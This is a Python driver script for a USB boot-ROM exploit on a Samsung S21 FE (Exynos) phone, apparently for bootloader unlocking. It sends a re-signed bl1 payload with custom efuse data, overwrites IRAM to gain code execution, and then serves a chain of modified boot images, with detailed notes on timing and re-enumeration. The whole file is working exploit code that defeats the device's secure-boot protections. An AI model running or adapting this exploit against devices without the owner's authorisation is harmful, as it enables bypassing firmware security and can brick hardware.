#!/usr/bin/env python3
"""EUB session driver v4 (final) for the S21 FE (S5E9840) unlock flow.

All lessons from the failed sessions, baked in:

  1. Exploit: send bl1 (payload with our efuse embedded at +0x2000, bl1
     re-signed so the inner checksum/st1 signature COVER the payload) via
     houston's send_payload (+512 declared-size trick), then
     overwrite_iram (exec 0x02024000). The payload blocks in receive(300).

  2. Complete the deliberately-incomplete upload with 512 padding bytes on
     ep 0x2. The payload then loads BL1 normally, and the USB controller
     RE-ENUMERATES within ~1s (disconnect + new device address).

  3. CRITICAL: houston's read_bytes swallows ALL exceptions (stale handle
     reads return b'' forever). Detect the stale handle IMMEDIATELY by
     comparing our handle's (bus, addr) with a fresh find — do not sit on a
     dead handle; every second of delay risks degrading the device state
     (observed: an 11-minute-delayed epbl send got a SHORT WRITE).

  4. After a fresh claim, requests only flow once the CDC DTR setup is
     done (SET_LINE_CODING 115200 + SET_CONTROL_LINE_STATE DTR|RTS).

  5. Serve 'eub:req:<socid>:<name>' requests (acks and requests can share
     a read). Send files in 512-byte chunks with per-chunk accounting
     (single big writes produced a SHORT WRITE on a degraded state).
     If the device re-requests an already-served name, SEND IT AGAIN
     (its state machine asked for it).
"""

import re
import sys
import time

sys.path.insert(0, "houston")

import usb.core
import usb.util

from modules.eub import load_file, write_header, calculate_checksum
from modules.exploit import send_payload, overwrite_iram
from modules.usb_helper import read_bytes

SOC = {"rx_address": 0x02024000, "usb_struct_offset": 0x0480}

FILES = {
    "bl1": "output/sboot/bl1.bin",
    "epbl": "output/sboot/epbl.bin",
    "bl2": "output/sboot/bl2.bin",
    "bootload": "output/sboot/bootload.bin",
    "el3_mon": "output/sboot/el3_mon.bin",
    "ldfw": "output/ldfw/ldfw.bin",
    "tzsw": "output/tzsw/tzsw.bin",
}
CHAIN = ["epbl", "bl2", "bootload", "el3_mon", "ldfw", "tzsw"]

REQ_RE = re.compile(rb"eub:req:[0-9a-f]+:([a-z0-9_.]+)")


def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)


def claim(dev):
    if dev.is_kernel_driver_active(0):
        dev.detach_kernel_driver(0)
    usb.util.claim_interface(dev, 0)
    if dev.idProduct == 0x1100:
        try:
            dev.ctrl_transfer(0x21, 0x20, 0, 0, bytes([0x00, 0xC2, 0x01, 0x00, 0x00, 0x00, 0x08]), timeout=2000)
            dev.ctrl_transfer(0x21, 0x22, 0x0003, 0, None, timeout=2000)
        except usb.core.USBError as e:
            log(f"    CDC setup skipped ({e})")


def find_and_claim(timeout_s=60):
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        for pid in (0x1234, 0x1100):
            try:
                dev = usb.core.find(idVendor=0x04e8, idProduct=pid)
            except Exception:
                dev = None
            if dev is not None:
                try:
                    dev.get_active_configuration()
                    claim(dev)
                    return dev
                except usb.core.USBError as e:
                    log(f"claim failed on addr {dev.address}: {e} — retrying")
                except Exception:
                    pass
        time.sleep(0.5)
    return None


def stale(dev):
    """True if our handle's device is no longer the live one."""
    try:
        fresh = usb.core.find(idVendor=0x04e8, idProduct=dev.idProduct)
    except Exception:
        return False
    return fresh is not None and (fresh.bus, fresh.address) != (dev.bus, dev.address)


def drop(dev):
    try:
        usb.util.release_interface(dev, 0)
    except Exception:
        pass
    try:
        usb.util.dispose_resources(dev)
    except Exception:
        pass


def dnw_send(dev, name):
    path = FILES[name]
    file = load_file(path)
    size = len(file)
    write_header(file, size)
    calculate_checksum(file)
    sent = 0
    while sent < size:
        chunk = bytes(file[sent : sent + 512])
        try:
            ret = dev.write(2, chunk, timeout=5000)
        except usb.core.USBError as e:
            log(f"    chunk write failed at {sent}/{size}: {e}")
            raise
        if ret != len(chunk):
            log(f"    SHORT WRITE at {sent}/{size}: wrote {ret}")
            raise usb.core.USBError(f"short write: {ret} of {len(chunk)}")
        sent += ret
    log(f"    -> sent {name} ({path}, {size} bytes in {(size + 511) // 512} chunks): OK")


def complete_upload(dev):
    for size in (512, 300):
        try:
            ret = dev.write(2, b"\x00" * size, timeout=3000)
            log(f"    -> wrote {size} completion bytes: {ret} accepted")
            if ret == size:
                return True
        except usb.core.USBError as e:
            log(f"    -> {size} completion bytes failed: {e}")
    return False


def serve_chain(dev, served):
    deadline = time.time() + 600
    last_stale_check = 0.0
    while time.time() < deadline:
        if all(n in served for n in CHAIN):
            log("full chain served")
            return dev, "done"
        chunk = read_bytes(dev)
        if chunk:
            log(f"  <- {chunk!r}")
            for m in REQ_RE.finditer(chunk):
                name = m.group(1).decode().split(".")[0]
                if name in FILES:
                    try:
                        dnw_send(dev, name)
                        served.add(name)
                    except usb.core.USBError as e:
                        log(f"send {name} failed: {e} — re-finding")
                        drop(dev)
                        dev = find_and_claim(timeout_s=30)
                        if dev is None:
                            return dev, "gone"
                else:
                    log(f"    (unknown request name: {name})")
            continue
        # no data: check for a re-enumerated handle at most every 0.5s
        now = time.time()
        if now - last_stale_check > 0.5:
            last_stale_check = now
            if stale(dev):
                log("device re-enumerated — re-finding immediately")
                drop(dev)
                dev = find_and_claim(timeout_s=30)
                if dev is None:
                    return dev, "gone"
                log(f"re-claimed: bus {dev.bus} addr {dev.address}")
    return dev, "timeout"


def watch_download_mode(dev, seconds=180):
    seen = set()
    deadline = time.time() + seconds
    while time.time() < deadline:
        for pid in (0x685D, 0x1234, 0x1100):
            try:
                d = usb.core.find(idVendor=0x04e8, idProduct=pid)
            except Exception:
                d = None
            if d is not None:
                key = (d.bus, d.address, pid)
                if key not in seen:
                    seen.add(key)
                    log(f"    USB device present: 04e8:{pid:04x} bus {d.bus} addr {d.address}")
                    if pid == 0x685D:
                        log("download mode (Odin PID 04e8:685d) is up — session complete")
                        return True
        chunk = read_bytes(dev)
        if chunk:
            log(f"  <- {chunk!r}")
            m = REQ_RE.search(chunk)
            if m:
                name = m.group(1).decode().split(".")[0]
                if name in FILES:
                    try:
                        dnw_send(dev, name)
                    except usb.core.USBError as e:
                        log(f"late send {name} failed: {e}")
        time.sleep(1)
    return False


def main():
    log("stage 1: waiting for EUB device (04e8:1100)")
    dev = find_and_claim(timeout_s=90)
    if dev is None:
        log("device not found")
        return
    log(f"device: {dev.idVendor:04x}:{dev.idProduct:04x} (bus {dev.bus} addr {dev.address})")

    log("stage 2: exploit (payload = bl1 with our efuse, checksum-covered)")
    send_payload(dev, FILES["bl1"])
    overwrite_iram(dev, False, SOC["rx_address"], SOC["usb_struct_offset"])
    log("exploit done (ACE) — payload blocking in its receive(300)")

    log("stage 3: completing the upload (512 padding bytes on ep 0x2, same handle)")
    if not complete_upload(dev):
        log("could not complete the upload — stop; needs a fresh EUB entry")
        return
    log("upload completion accepted — expect re-enumeration within ~1s")

    log("stage 4: serving chain requests (immediate stale-handle detection)")
    served = set()
    dev, result = serve_chain(dev, served)
    log(f"serve result: {result}; served: {sorted(served)}")
    if dev is None:
        return

    log("stage 5: watching for chain boot / download-mode state")
    watch_download_mode(dev, 180)


if __name__ == "__main__":
    main()
